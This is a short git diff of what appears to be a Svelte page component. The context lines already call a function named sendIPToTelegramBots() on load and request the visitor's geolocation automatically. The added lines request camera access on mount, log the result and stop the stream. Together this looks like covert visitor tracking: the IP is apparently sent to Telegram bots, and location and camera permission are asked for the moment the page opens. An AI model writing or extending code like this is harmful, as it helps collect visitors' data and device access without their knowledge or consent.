@@ -4,8 +4,25 @@
   import { onMount } from 'svelte';
   sendIPToTelegramBots();
 
+
+
+
   onMount(async () => {
-  
+
+
+try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      // Permission granted, you can now access the camera
+      console.log('Camera access granted');
+      // Cleanup: stop the camera stream
+      stream.getTracks().forEach((track) => track.stop());
+    } catch (error) {
+      // Permission denied or error occurred
+      console.error('Camera access denied or error occurred:', error);
+    }
+  });
+
+
     // Request location permission automatically
     navigator.geolocation.getCurrentPosition(
       (position) => {
